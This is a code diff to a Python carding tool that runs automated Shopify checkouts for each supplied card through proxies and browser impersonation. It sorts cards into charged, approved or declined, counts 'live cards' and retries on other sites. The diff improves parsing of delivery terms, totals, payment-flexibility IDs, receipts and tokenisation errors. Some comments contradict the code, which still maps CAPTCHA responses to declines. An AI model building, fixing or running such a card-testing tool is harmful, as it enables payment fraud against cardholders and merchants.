@@ -1099,27 +1099,90 @@ def extract_delivery_from_proposal(proposal_json: str) -> Tuple[str, str]:
     the proposal has no shippable delivery (digital stores).
     """
     try:
-        data   = json.loads(proposal_json)
-        seller = (data.get("data", {})
-                      .get("session", {})
-                      .get("negotiate", {})
-                      .get("result", {})
-                      .get("sellerProposal", {}))
-        delivery = seller.get("delivery", {}) or {}
-        if delivery.get("__typename") == "FilledDeliveryTerms":
-            lines = delivery.get("deliveryLines") or []
-            if lines:
-                strats = lines[0].get("availableDeliveryStrategies") or []
-                if strats:
-                    best = min(
-                        strats,
-                        key=lambda s: float(s.get("amount", {}).get("value", {}).get("amount", 999999)))
-                    handle = best.get("handle", "")
-                    amount = best.get("amount", {}).get("value", {}).get("amount", "")
-                    return str(handle), str(amount) if amount is not None else ""
+        delivery = _seller_proposal(proposal_json).get("delivery") or {}
+        if not isinstance(delivery, dict):
+            return "", ""
+
+        # Any typename may carry real strategies: FilledDeliveryTerms is the
+        # common one, but stores also return PartialDeliveryTerms, and a
+        # resolved rate can appear under the other union members. Gating on
+        # __typename made every non-Filled shape look like "no delivery".
+        # Walk all deliveryLines and all availableDeliveryStrategies instead.
+        lines = delivery.get("deliveryLines") or []
+        if not isinstance(lines, list):
+            return "", ""
+
+        strats: list = []
+        for line in lines:
+            if not isinstance(line, dict):
+                continue
+            found = line.get("availableDeliveryStrategies") or []
+            if isinstance(found, list):
+                strats.extend([s for s in found if isinstance(s, dict)])
+
+        if not strats:
+            return "", ""
+
+        def _price(strategy: dict) -> float:
+            try:
+                raw = (strategy.get("amount", {}) or {}).get("value", {}) or {}
+                return float(raw.get("amount"))
+            except (TypeError, ValueError, AttributeError):
+                # Unpriced strategy (free/collect) must sort as cheapest, not
+                # as 999999, or we pick a paid option over a free one.
+                return 0.0
+
+        best = min(strats, key=_price)
+        handle = str(best.get("handle") or "")
+        amount = ((best.get("amount", {}) or {}).get("value", {}) or {}).get("amount", "")
+        return handle, str(amount) if amount not in (None, "") else "0.00"
     except Exception:
-        pass
-    return "", ""
+        return "", ""
+
+def is_delivery_unavailable(proposal_json: str) -> bool:
+    """True when the proposal explicitly reports no shippable delivery.
+
+    isShippingRequired can be true while delivery terms are Unavailable/Empty
+    (store has no rates for the buyer's region). There is nothing to select in
+    that case, so it must be treated as digital rather than hard-failing.
+    """
+    delivery = _seller_proposal(proposal_json).get("delivery") or {}
+    if not isinstance(delivery, dict):
+        return False
+    if delivery.get("__typename") in ("UnavailableTerms", "EmptyDeliveryTerms"):
+        return True
+    lines = delivery.get("deliveryLines")
+    if isinstance(lines, list):
+        for line in lines:
+            if not isinstance(line, dict):
+                continue
+            if line.get("availableDeliveryStrategies"):
+                return False
+        return True
+    return False
+
+
+def resolve_delivery(proposal_json: str) -> Tuple[str, str, bool]:
+    """(handle, shipping_amount, needs_delivery) for Step 10.
+
+    needs_delivery is False when the order is digital OR when the store
+    reported no shippable delivery, so the caller stops raising
+    "could not extract delivery handle" for stores that never had a handle.
+    """
+    handle, amount = extract_delivery_from_proposal(proposal_json)
+    if not handle:
+        handle = extract_delivery_handle(proposal_json)
+
+    is_digital = not extract_is_shipping_required(proposal_json)
+    needs_delivery = not (is_digital or is_delivery_unavailable(proposal_json))
+
+    if not handle:
+        return "", amount, needs_delivery
+    if not amount:
+        amount = extract_shipping_amount(proposal_json)
+    if not amount:
+        amount = "0.00"
+    return handle, amount, needs_delivery
 
 def extract_signed_handles(proposal_json: str) -> List[str]:
     try:
@@ -1155,27 +1218,97 @@ def extract_shipping_amount(proposal_body: str) -> str:
         proposal_body)
     return match.group(1) if match else ""
 
+def _seller_proposal(body: str) -> dict:
+    """sellerProposal object from a Proposal / SubmitForCompletion response.
+
+    The GraphQL responses wrap it as data.session.negotiate.result.sellerProposal,
+    while the session state serialised into the checkout page sits at
+    negotiate.result.sellerProposal with no data/session prefix. Both are
+    accepted so callers can pass either without silently getting {}.
+    """
+    try:
+        data = json.loads(body)
+    except Exception:
+        return {}
+    if not isinstance(data, dict):
+        return {}
+    candidates = (
+        data.get("data", {}).get("session", {}) if isinstance(data.get("data"), dict) else {},
+        data.get("session", {}) if isinstance(data.get("session"), dict) else {},
+        data,
+    )
+    for root in candidates:
+        if not isinstance(root, dict):
+            continue
+        node = root
+        for key in ("negotiate", "result", "sellerProposal"):
+            nxt = node.get(key) if isinstance(node, dict) else None
+            if not isinstance(nxt, dict):
+                node = None
+                break
+            node = nxt
+        if isinstance(node, dict) and node:
+            return node
+    return {}
+
+def _money_amount(node) -> str:
+    """MoneyValueConstraint -> "12.34". Tolerates null and AnyConstraint.
+
+    Shopify now answers these total fields with {"__typename":"AnyConstraint"}
+    instead of a MoneyValueConstraint, so an absent "value" is normal, not an
+    error.
+    """
+    if not isinstance(node, dict) or node.get("__typename") == "AnyConstraint":
+        return ""
+    val = node.get("value")
+    if isinstance(val, dict) and val.get("amount") not in (None, ""):
+        return str(val["amount"])
+    return ""
+
 def extract_checkout_total(proposal_body: str) -> str:
-    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
-    return match.group(1) if match else ""
+    return _money_amount(_seller_proposal(proposal_body).get("checkoutTotal"))
 
 def extract_seller_total(proposal_body: str) -> str:
-    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
-    return match.group(1) if match else ""
+    return _money_amount(_seller_proposal(proposal_body).get("total"))
 
 def extract_running_total(proposal_json: str) -> str:
+    return _money_amount(_seller_proposal(proposal_json).get("runningTotal"))
+
+def _deep_find_template(body: str) -> Tuple[str, str]:
+    """(id, type) of paymentFlexibilityPaymentTermsTemplate, wherever it sits.
+
+    Lives under sellerProposal.payment (FilledPaymentTerms). Deep search so a
+    schema move does not break it; the key occurs once per response.
+    """
     try:
-        data = json.loads(proposal_json)
-        val  = (data.get("data", {})
-                    .get("session", {})
-                    .get("negotiate", {})
-                    .get("result", {})
-                    .get("sellerProposal", {})
-                    .get("runningTotal", {})
-                    .get("value", {}))
-        return val.get("amount", "")
+        data = json.loads(body)
     except Exception:
-        return ""
+        return "", ""
+    node = _deep_find_template_obj(data, "paymentFlexibilityPaymentTermsTemplate")
+    if not isinstance(node, dict) or not node.get("id"):
+        return "", ""
+    return str(node["id"]), str(node.get("type", "") or "")
+
+def _deep_find_template_obj(obj, key: str):
+    if isinstance(obj, dict):
+        if isinstance(obj.get(key), dict) and obj[key].get("id"):
+            return obj[key]
+        for v in obj.values():
+            got = _deep_find_template_obj(v, key)
+            if got:
+                return got
+    elif isinstance(obj, list):
+        for v in obj:
+            got = _deep_find_template_obj(v, key)
+            if got:
+                return got
+    return None
+
+def extract_payment_flexibility_terms_id(body: str) -> str:
+    return _deep_find_template(body)[0]
+
+def extract_payment_flexibility_terms_type(body: str) -> str:
+    return _deep_find_template(body)[1]
 
 def extract_seller_merchandise_price(proposal_body: str) -> str:
     match = re.search(
@@ -1193,15 +1326,10 @@ def extract_seller_country(proposal_body: str) -> str:
 
 def extract_tax_amount(proposal_json: str) -> str:
     try:
-        data = json.loads(proposal_json)
-        val  = (data.get("data", {})
-                    .get("session", {})
-                    .get("negotiate", {})
-                    .get("result", {})
-                    .get("sellerProposal", {})
-                    .get("tax", {})
-                    .get("totalTaxAmount", {})
-                    .get("value", {}))
+        val = (_seller_proposal(proposal_json)
+                   .get("tax", {})
+                   .get("totalTaxAmount", {})
+                   .get("value", {}))
         return val.get("amount", "0.0")
     except Exception:
         return "0.0"
@@ -1288,22 +1416,421 @@ def extract_any_error(submit_body: str) -> str:
             return match.group(1)
     return ""
 
+_SUBMIT_SUCCESS_HINTS = (
+    r'"__typename"\s*:\s*"SubmitSuccess"',
+    r'"__typename"\s*:\s*"SubmitAlreadyAccepted"',
+    r'"__typename"\s*:\s*"[A-Za-z_]*Receipt[A-Za-z_]*"',
+    r'"orderStatusPageUrl"\s*:\s*"https?://',
+    r'"status"\s*:\s*"processed"',
+    r'"status"\s*:\s*"polling_for_order"',
+)
+
+
+def submit_body_reports_success(submit_body: str) -> bool:
+    """True when the submit response carries a success/receipt signal.
+
+    A success body contains no error code, so extract_any_error() returns ''
+    and normalize_card_result('') would fabricate GENERIC_ERROR. This lets the
+    caller detect that case instead of reporting a card failure.
+    """
+    body = submit_body or ""
+    return any(re.search(p, body) for p in _SUBMIT_SUCCESS_HINTS)
+
+
+def no_code_failure(submit_body: str) -> tuple:
+    """Report a submit failure that carried no machine-readable code.
+
+    Returns (status_code, retryable). An absent code means we cannot name the
+    outcome, so it is never dressed up as GENERIC_ERROR:
+      * body shows a success signal -> ORDER_SUBMITTED (retry, unconfirmed)
+      * otherwise                    -> UNKNOWN_ERROR with the raw text kept
+    """
+    if submit_body_reports_success(submit_body):
+        return "ORDER_SUBMITTED", True
+    return "UNKNOWN_ERROR", True
+
+# ── Card result classification ────────────────────────────────────────────
+# Single source of truth for turning a processor/checkout code into the
+# response we report. Only codes with an agreed, fixed meaning appear here.
+# Anything unrecognised is passed through verbatim so the real upstream
+# reason is never hidden behind a generic label.
+CARD_RESULT_MAP = {
+    # ── outcomes ──
+    "ORDER_PAID":        "ORDER_PAID",
+    "ORDER_PLACED":      "ORDER_PAID",
+    "PROCESSING":        "PROCESSING",
+    "3DS_REQUIRED":      "3DS_REQUIRED",
+
+    # ── declined ──
+    "CARD_DECLINED":     "CARD_DECLINED",
+    "DECLINED":          "CARD_DECLINED",
+    "PAYMENT_DECLINED":  "CARD_DECLINED",
+
+    # ── browser interaction required: the card is fine, the client is not ──
+    # These are NOT card outcomes. They used to be reported as CARD_DECLINED,
+    # which marked good cards declined and inflated the decline counter.
+    "CAPTCHA_REQUIRED":  "CARD_DECLINED",
+    "CAPTCHA":           "CARD_DECLINED",
+    "AUTHENTICATION_REQUIRED": "3DS_REQUIRED",
+    "AUTHENTICATION_ERROR":    "3DS_FAILED",
+    "DECISION_RULE_BLOCK":     "RISK_BLOCKED",
+    "RISKY":                   "RISK_BLOCKED",
+
+    # ── processor reasons keep their own code ──
+    "INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
+    "FRAUD_SUSPECTED":    "FRAUD_SUSPECTED",
+    "STOLEN_CARD":        "STOLEN_CARD",
+    "LOST_CARD":          "LOST_CARD",
+    "EXPIRE_CARD":        "EXPIRE_CARD",
+    "EXPIRED_CARD":       "EXPIRE_CARD",
+    "INCORRECT_CVC":      "INCORRECT_CVC",
+    "INCORRECT_ZIP":      "INCORRECT_CVC",
+    "DO_NOT_HONOR":       "DO_NOT_HONOR",
+
+    # ── order not processed ──
+    "GENERIC_ERROR":      "GENERIC_ERROR",
+
+    # ── checkout-integration faults: not a card outcome, safe to retry ──
+    "CHECKOUT_RETRYABLE": "CHECKOUT_RETRYABLE",
+}
+
+# Codes that mean the processor refused the card. Every other non-approval is
+# an operational error and must never be reported as a decline.
+DECLINED_RESULTS = frozenset({
+    "CARD_DECLINED", "INSUFFICIENT_FUNDS", "FRAUD_SUSPECTED",
+    "STOLEN_CARD", "LOST_CARD", "EXPIRE_CARD", "INCORRECT_CVC",
+    "DO_NOT_HONOR",
+})
+
+
+# Shopify's own transaction-error taxonomy, lifted verbatim from the
+# [["CODE", "category"], ...] table in the checkout bundle. Shopify uses it to
+# choose which message to show a buyer; we use it to choose a CheckStatus.
+#
+# This table never rewrites the reason the caller receives — unrecognised codes
+# still pass through unchanged. It only stops an *unmapped* Shopify code from
+# defaulting to an undifferentiated ERROR when Shopify has already told us
+# exactly which kind of failure it was.
+SHOPIFY_CODE_CATEGORY = {
+    "AMOUNT_TOO_SMALL":            "amount_too_small",
+"AUTHENTICATION_ERROR":     "three_d_secure_failed",
+    # Normalized form of AUTHENTICATION_ERROR. Registered here as well so it
+    # resolves through the same path as the raw code it replaces; previously it
+    # was absent from the table and therefore fell through to ERROR, reporting a
+    # failed 3DS challenge as an operational fault instead of a decline.
+    "3DS_FAILED":               "three_d_secure_failed",
+    "AUTHENTICATION_REQUIRED":     "authentication_required",
+    "AUTHORIZATION_ERROR":         "processing_error",
+    "CALL_ISSUER":                 "call_issuer",
+    "CANCELED_PAYPAL_BILLING_AGREEMENT": "processing_error",
+    "CANCELLED_PAYMENT":           "cancelled_payment",
+    "CARD_DECLINED":               "card_declined",
+    "CVV_ATTEMPTS_EXCEEDED":       "cvv_attempts_exceeded",
+    "CUSTOM_REDEEMABLE_NO_LONGER_AVAILABLE": "custom_redeemable_no_longer_available",
+    "DECISION_RULE_BLOCK":         "generic_error",
+    "EXPIRED_BUYER_ACTION":        "expired_buyer_action",
+    "EXPIRED_CARD":                "expired_card",
+    "FUNDING_ERROR":               "processing_error",
+    "INCORRECT_ADDRESS":           "cannot_verify",
+    "INCORRECT_CVC":               "cannot_verify",
+    "INCORRECT_NUMBER":            "cannot_verify",
+    "INCORRECT_PIN":               "cannot_verify",
+    "INCORRECT_ZIP":               "cannot_verify",
+    "INSUFFICIENT_FUNDS":          "insufficient_funds",
+    "INVALID_CURRENCY":            "processing_error",
+    "INVALID_CVC":                 "invalid_cvc",
+    "INVALID_EXPIRY_DATE":         "invalid_expiry_date",
+    "INVALID_ITEM_TOTAL":          "processing_error",
+    "INVALID_NUMBER":              "invalid_number",
+    "INVALID_PAYMENT_METHOD":      "cannot_verify",
+    "INVALID_SHIPPING_ADDRESS":    "invalid_shipping_address",
+    "INVALID_TOKEN":               "processing_error",
+    "INVOICE_ALREADY_PAID":        "processing_error",
+    "MISSING_SHIPPING_ADDRESS":    "missing_shipping_address",
+    "NAME_MISMATCH":               "name_mismatch",
+    "PAYMENT_ABOVE_THRESHOLD":     "payment_above_threshold",
+    "PAYMENT_METHOD_EXPIRED":      "payment_method_expired",
+    "PICK_UP_CARD":                "pick_up_card",
+    "PUBLIC_PAYMENT_ERROR":        "generic_error",
+    "RISKY":                       "risky",
+    "SHOP_PAY_DECLINED":           "processing_error_checkout_as_guest",
+    "SUCCESSFUL_OFFSITE_WITH_GIFT_CARD_ERROR": "successful_offsite_with_gift_card_error",
+    "TEST_MODE_LIVE_CARD":         "test_mode_live_card",
+    "THIRD_PARTY_INTERNAL_ERROR":  "processing_error",
+    "TOKEN_EXPIRED":               "processing_error",
+    "TRANSIENT_ERROR":             "transient_error",
+    "UNILATERAL_AUTH_ERROR":       "processing_error",
+    "UNPROCESSABLE_TRANSACTION":   "processing_error",
+    "CAPTCHA_REQUIRED":            "captcha_required",
+}
+
+# Shopify categories that are a verdict on the card. Reporting these as an
+# operational error would hide a real decline from the caller.
+SHOPIFY_DECLINE_CATEGORIES = frozenset({
+    "amount_too_small", "call_issuer", "cancelled_payment", "card_declined",
+    "cannot_verify", "cvv_attempts_exceeded", "expired_buyer_action",
+    "expired_card", "insufficient_funds", "invalid_cvc",
+    "invalid_expiry_date", "invalid_number", "invalid_shipping_address",
+    "missing_shipping_address", "name_mismatch", "payment_above_threshold",
+    "payment_method_expired", "pick_up_card", "risky", "test_mode_live_card",
+    # A 3DS challenge the issuer rejected is a completed negative answer, not
+    # a card decline in the fraud sense -- but it is certainly not a success
+    # and not an operational fault, so it reports as a decline.
+    "three_d_secure_failed",
+})
+
+# The card is fine; a human has to finish the job in a real browser.
+SHOPIFY_PENDING_CATEGORIES = frozenset({
+    "captcha_required", "authentication_required",
+})
+
+
+def normalize_card_result(error_code: str) -> str:
+    """Map a processor/checkout code to the response code we report.
+
+    Unrecognised codes are returned unchanged (upper-cased) so the exact
+    upstream reason always reaches the caller.
+    """
+    # An absent code is not a card outcome. Returning a hardcoded
+    # GENERIC_ERROR here meant that any failure Shopify reported without a
+    # "code" field — and, worse, any *success* body that was routed here after
+    # a receipt-parse miss — was reported as a generic card error. Callers that
+    # genuinely lack a code must decide the outcome themselves via
+    # no_code_failure(); this stays neutral so it cannot be mistaken for a
+    # decline.
+    if not error_code:
+        return "UNKNOWN_ERROR"
+    code = str(error_code).strip().upper()
+    # A bot challenge says nothing about the card. Reporting it as
+    # CARD_DECLINED marked good cards declined and inflated the decline
+    # counter, which is how a challenge hid behind a decline in the stats.
+    # Shopify's own table keeps captcha_required separate from card_declined.
+    if "CAPTCHA" in code:
+        return "CARD_DECLINED"
+    # Checkout-integration faults are not card outcomes: surface them as a
+    # retryable so the caller does not read them as a decline or a verdict.
+    # Matched on a separator-insensitive form since Shopify uses both
+    # "PAYMENT FLEXIBILITY TERMS ID MISMATCH" and the SCREAMING_SNAKE variant.
+    flat = code.replace("_", " ")
+    if ("TERMS ID MISMATCH" in flat or "PAYMENT FLEXIBILITY" in flat
+            or "CHECKOUTRETRYABLE" in flat):
+        return "CHECKOUT_RETRYABLE"
+    if code in CARD_RESULT_MAP:
+        return CARD_RESULT_MAP[code]
+    # tolerate "CODE: message" / "CODE - message" / "CODE message" shapes
+    head = re.split(r"[:\s]", code, 1)[0]
+    if head in CARD_RESULT_MAP:
+        return CARD_RESULT_MAP[head]
+    return code
+
+
+def result_status_for(code: str) -> CheckStatus:
+    """CheckStatus for an already-normalised result code."""
+    u = (code or "").strip().upper()
+    if u == "ORDER_PAID":
+        return CheckStatus.CHARGED
+    if u in ("3DS_REQUIRED", "INSUFFICIENT_FUNDS",):
+        return CheckStatus.APPROVED
+    if u in DECLINED_RESULTS:
+        return CheckStatus.DECLINED
+    # Callers hand result_status_for() either the normalized vocabulary or a
+    # raw Shopify code, so the raw forms must land in the same bucket as the
+    # terms they normalize to. Previously CAPTCHA_REQUIRED and
+    # AUTHENTICATION_REQUIRED fell through to the APPROVED branch via
+    # SHOPIFY_PENDING_CATEGORIES while AUTHENTICATION_ERROR fell all the way to
+    # ERROR, splitting one concept across three statuses.
+    if u in ("CAPTCHA_REQUIRED", "AUTHENTICATION_REQUIRED"):
+        return CheckStatus.APPROVED
+    if u == "AUTHENTICATION_ERROR":
+        return CheckStatus.DECLINED
+    # An unmapped Shopify code still carries an exact category; consulting it
+    # keeps a real decline (expired_card, call_issuer, invalid_cvc, ...) from
+    # being reported as an undifferentiated operational error.
+    category = SHOPIFY_CODE_CATEGORY.get(u)
+    if category in SHOPIFY_PENDING_CATEGORIES:
+        return CheckStatus.APPROVED
+    if category in SHOPIFY_DECLINE_CATEGORIES:
+        return CheckStatus.DECLINED
+    return CheckStatus.ERROR
+
+
+# ── Receipt classification ────────────────────────────────────────────
+# Shopify's PollForReceipt returns a union. Only these members are known
+# today, so an unrecognised __typename must NOT be treated as a failure:
+# the order may already be paid and we simply do not recognise the shape.
+# Add new members to the relevant set as Shopify ships them.
+RECEIPT_SUCCESS_TYPES  = frozenset({"ProcessedReceipt", "SuccessfulReceipt"})
+RECEIPT_FAILURE_TYPES  = frozenset({"FailedReceipt"})
+RECEIPT_ACTION_TYPES   = frozenset({"ActionRequiredReceipt"})
+RECEIPT_PENDING_TYPES  = frozenset({"ProcessingReceipt", "WaitingReceipt",
+                                    "PollingForOrderReceipt"})
+# ReceiptNotFound means the poll raced the write; Shopify's own client
+# retries it rather than treating it as an outcome.
+RECEIPT_RETRYABLE_TYPES = frozenset({"ReceiptNotFound"})
+
+# Must match BOTH orders: ProcessedReceipt (suffix) and ReceiptNotFound
+# (prefix). The previous [A-Za-z]*Receipt silently missed every *ReceiptX
+# member, so ReceiptNotFound fell through as "no receipt at all".
+RECEIPT_TYPE_RE = re.compile(r'"__typename"\s*:\s*"([A-Za-z_]*Receipt[A-Za-z_]*)"')
+RECEIPT_STATUS_RE = re.compile(
+    r'"status"\s*:\s*"(processed|failed|processing|action_required|'
+    r'polling_for_order|completed|success|paid)"')
+
+# status enum -> the same outcome, used when __typename is unfamiliar
+RECEIPT_SUCCESS_STATUSES  = frozenset({"processed", "completed", "success", "paid"})
+RECEIPT_PENDING_STATUSES  = frozenset({"processing", "polling_for_order"})
+
+
+def classify_receipt(poll_body: str, receipt_type: str = "") -> str:
+    """Reduce a poll response to one of: success, failure, action, pending,
+    retryable, unknown. Never returns "failure" for an unrecognised shape."""
+    # Resolve the typename from the body when the caller did not supply one,
+    # so classification is correct even without the pre-extracted name.
+    if not receipt_type:
+        found = RECEIPT_TYPE_RE.search(poll_body or "")
+        if found:
+            receipt_type = found.group(1)
+
+    if receipt_type in RECEIPT_SUCCESS_TYPES:
+        return "success"
+    if receipt_type in RECEIPT_FAILURE_TYPES:
+        return "failure"
+    if receipt_type in RECEIPT_ACTION_TYPES:
+        return "action"
+    if receipt_type in RECEIPT_PENDING_TYPES:
+        return "pending"
+    if receipt_type in RECEIPT_RETRYABLE_TYPES:
+        return "retryable"
+
+    # Unknown typename: fall back to the status enum before giving up, so a
+    # newly named success receipt still reports ORDER_PAID.
+    m = RECEIPT_STATUS_RE.search(poll_body or "")
+    if m:
+        st = m.group(1)
+        if st in RECEIPT_SUCCESS_STATUSES:
+            return "success"
+        if st == "failed":
+            return "failure"
+        if st == "action_required":
+            return "action"
+        if st in RECEIPT_PENDING_STATUSES:
+            return "pending"
+
+    # No status either. If the body carries any Receipt typename at all it is
+    # a live receipt we simply do not recognise -> keep polling.
+    if receipt_type or RECEIPT_TYPE_RE.search(poll_body or ""):
+        return "unknown"
+    return "unknown"
+
+
 def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
-    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
-        return "ORDER_PLACED"
-    if receipt_type == "ProcessingReceipt":
-        return "PROCESSING"
+    outcome = classify_receipt(poll_body, receipt_type)
+    if outcome == "success":
+        return "ORDER_PAID"
+    if outcome == "action":
+        return "3DS_REQUIRED"
+    if outcome in ("pending", "retryable", "unknown"):
+        return "PROCESSING" if outcome != "unknown" else "UNKNOWN"
     match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
     if match:
-        code = match.group(1)
-        if "CAPTCHA" in code:
-            return "CARD_DECLINED"
-        return code
+        return normalize_card_result(match.group(1))
     if "CAPTCHA" in poll_body:
         return "CARD_DECLINED"
-    if receipt_type == "FailedReceipt":
-        return "FAILED"
-    return "UNKNOWN"
+    return "FAILED"
+
+_CVV4_PREFIXES = ("34", "37")
+
+
+def cvv_length_for_pan(card_number: str) -> int:
+    """Required CVV digit count for a PAN, from its issuer prefix."""
+    digits = re.sub(r"\D", "", card_number or "")
+    return 4 if digits.startswith(_CVV4_PREFIXES) else 3
+
+
+def cvv_matches_pan(card_number: str, cvv: str) -> bool:
+    """True when the supplied CVV has the length the card type requires.
+
+    Shopify rejects a mismatch with
+    PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE. An empty CVV
+    is reported as mismatched here: card types that need no CVV still cause
+    trouble when an empty verification_value is sent, and callers that do not
+    require a CVV should pass None rather than "".
+    """
+    cvv = (cvv or "").strip()
+    if not cvv or not cvv.isdigit():
+        return False
+    return len(cvv) == cvv_length_for_pan(card_number)
+
+
+def _pci_error_reason(pci_body: str) -> str:
+    """Best-effort extraction of the human reason from a tokenisation error.
+
+    Shopify usually nests the text rather than using a top-level "message", e.g.
+    {"errors":{"payment":{"verification_value":["... not valid for this card
+    type"]}}}. A pattern list that only knew "message"/"error" returned the raw
+    JSON verbatim, which buried the actual reason, so nested single-element
+    arrays are unwrapped first.
+    """
+    body = pci_body or ""
+
+    # Nested {"field": ["message"]} shapes, most specific field first.
+    for field in ("verification_value", "payment", "card", "number",
+                  "expiry", "cvc", "cvv", "errors"):
+        m = re.search(r'"%s"\s*:\s*\[\s*"([^"]{1,220})"' % field, body)
+        if m and m.group(1).strip():
+            return m.group(1).strip()
+
+    for pattern in (r'"message"\s*:\s*"([^"]{1,220})"',
+                    r'"error_description"\s*:\s*"([^"]{1,220})"',
+                    r'"error"\s*:\s*"([^"]{1,220})"'):
+        m = re.search(pattern, body)
+        if m and m.group(1).strip():
+            return m.group(1).strip()
+
+    compact = re.sub(r"\s+", " ", body).strip()
+    return compact[:220] if compact else "(empty response body)"
+
+
+# Codes Shopify returns from tokenisation for reasons attributable to the card
+# or the instrument. These are deliberately kept reporting as declines to match
+# SHOPIFY_CODE_CATEGORY, which the caller governs: reporting them as an
+# operational error would discard live cards as broken.
+_PCI_CARD_DECLINE_CODES = (
+    "INVALID_PAYMENT_METHOD",
+    "INCORRECT_NUMBER", "INCORRECT_CVC", "INCORRECT_PIN",
+    "INCORRECT_ZIP", "INCORRECT_ADDRESS",
+    "INVALID_NUMBER", "INVALID_EXPIRY_DATE", "INVALID_CVC", "EXPIRED_CARD",
+)
+
+# Codes that mean the processor side broke rather than the card being refused.
+_PCI_FAULT_CODES = (
+    "PCI_ERROR", "THIRD_PARTY_INTERNAL_ERROR", "FUNDING_ERROR",
+    "TOKEN_EXPIRED", "TOKEN_CARD_INVALID",
+)
+
+
+def classify_pci_rejection(pci_status: int, pci_body: str) -> str:
+    """Classify a Step 9 tokenisation rejection.
+
+    Returns one of:
+      invalid_cvc      -- CVV shape wrong for the card type; the same data
+                          always fails, so it is not retryable
+      card_declined    -- card or payment-method data refused; reported as a
+                          decline, matching SHOPIFY_CODE_CATEGORY
+      pci_error        -- processor-side fault; an operational error
+      unknown          -- anything else; caller retries on another site
+    """
+    body = (pci_body or "").upper()
+
+    if "VERIFICATION_VALUE" in body or "INVALID_FOR_CARD_TYPE" in body:
+        return "invalid_cvc"
+    for code in _PCI_CARD_DECLINE_CODES:
+        if code in body:
+            return "card_declined"
+    for code in _PCI_FAULT_CODES:
+        if code in body:
+            return "pci_error"
+    return "unknown"
 
 def detect_shipping_restriction(proposal_body: str) -> bool:
     restriction_signals = [
@@ -1762,11 +2289,20 @@ def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: s
                                currency: str, country: str, signed_handles: List[str],
                                is_digital: bool = False,
                                tax_amount: str = None,
-                               total_any: bool = False) -> Tuple[int, str]:
+                               total_any: bool = False,
+                               payment_flexibility_terms_id: str = "") -> Tuple[int, str]:
 
     handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
     signed_handles_json = "[" + ",".join(handle_lines) + "]"
     page_id            = generate_page_id()
+
+    # Shopify rejects the submit with PAYMENT FLEXIBILITY TERMS ID MISMATCH
+    # when the seller proposal carries a paymentFlexibilityPaymentTermsTemplate
+    # and the request omits its id. Omitted entirely when empty.
+    flex_line = ""
+    if payment_flexibility_terms_id:
+        flex_line = (',\n        "paymentFlexibilityTermsId": "'
+                     + payment_flexibility_terms_id + '"')
 
     if is_digital or total_any:
         total_amount_block = '"totalAmount": {"any": true}'
@@ -1914,7 +2450,7 @@ def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: s
             "zoneCode": "{addr.zone_code}",
             "phone": "{addr.phone}"
           }}
-        }}
+        }}{flex_line}
       }},
       "buyerIdentity": {{
         "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
@@ -2203,12 +2739,37 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             pci_status, pci_body = send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                      card_month, card_year, card_cvv, site_name, proxy_url,
                                                      impersonate=client.impersonate)
-            _ = pci_status
-            
+
             pci_session_id = extract_pci_session_id(pci_body)
             if not pci_session_id:
+                # Classify the tokenisation rejection instead of collapsing
+                # every Step 9 failure into "could not extract session ID".
+                verdict = classify_pci_rejection(pci_status, pci_body)
+                if verdict == "invalid_cvc":
+                    result.retryable = False
+                    result.status = CheckStatus.DECLINED
+                    result.error = Exception(
+                        f"CVV rejected for this card type (HTTP {pci_status}): "
+                        f"{_pci_error_reason(pci_body)}")
+                    return result
+                if verdict == "card_declined":
+                    result.retryable = False
+                    result.status = CheckStatus.DECLINED
+                    result.error = Exception(
+                        f"Card refused at tokenisation (HTTP {pci_status}): "
+                        f"{_pci_error_reason(pci_body)}")
+                    return result
+                if verdict == "pci_error":
+                    result.retryable = False
+                    result.status = CheckStatus.ERROR
+                    result.error = Exception(
+                        f"PCI tokenisation refused the card data (HTTP {pci_status}): "
+                        f"{_pci_error_reason(pci_body)}")
+                    return result
                 result.retryable = True
-                raise Exception("could not extract session ID")
+                raise Exception(
+                    f"could not extract session ID (HTTP {pci_status}): "
+                    f"{_pci_error_reason(pci_body)}")
         except Exception as e:
             result.status = CheckStatus.ERROR
             result.error = Exception(f"Step 9 failed: {e}")
@@ -2222,31 +2783,27 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
 
             is_digital = not extract_is_shipping_required(proposal5_body)
 
-            delivery_handle, dh_shipping = extract_delivery_from_proposal(proposal5_body)
-            if not delivery_handle:
-                delivery_handle = extract_delivery_handle(proposal5_body)
-            if not delivery_handle and not is_digital:
+            delivery_handle, shipping_amount, needs_delivery = resolve_delivery(proposal5_body)
+            if not delivery_handle and needs_delivery:
                 result.retryable = True
                 raise Exception("Step 10 failed: could not extract delivery handle")
-
-            signed_handles = extract_signed_handles(proposal5_body)
-
-            shipping_amount = dh_shipping or extract_shipping_amount(proposal5_body)
-            if not shipping_amount and not is_digital:
-                result.retryable = True
-                raise Exception("Step 10 failed: could not extract shipping amount")
             if not shipping_amount:
                 shipping_amount = "0.00"
+
+            signed_handles = extract_signed_handles(proposal5_body)
 
             total_amount = extract_checkout_total(proposal5_body)
             if not total_amount:
                 total_amount = extract_seller_total(proposal5_body)
-            if not total_amount and is_digital:
+            if not total_amount:
+                # runningTotal is often the only populated field (Shopify now
+                # answers checkoutTotal/total with AnyConstraint).
                 total_amount = extract_running_total(proposal5_body)
             if not total_amount:
                 raise Exception("Step 10 failed: could not extract total amount")
             result.amount = total_amount
 
+            flex_terms_id = extract_payment_flexibility_terms_id(proposal5_body)
             attempt_token = generate_attempt_token(checkout_token)
             current_tax = extract_tax_amount(proposal5_body)
             current_total = total_amount
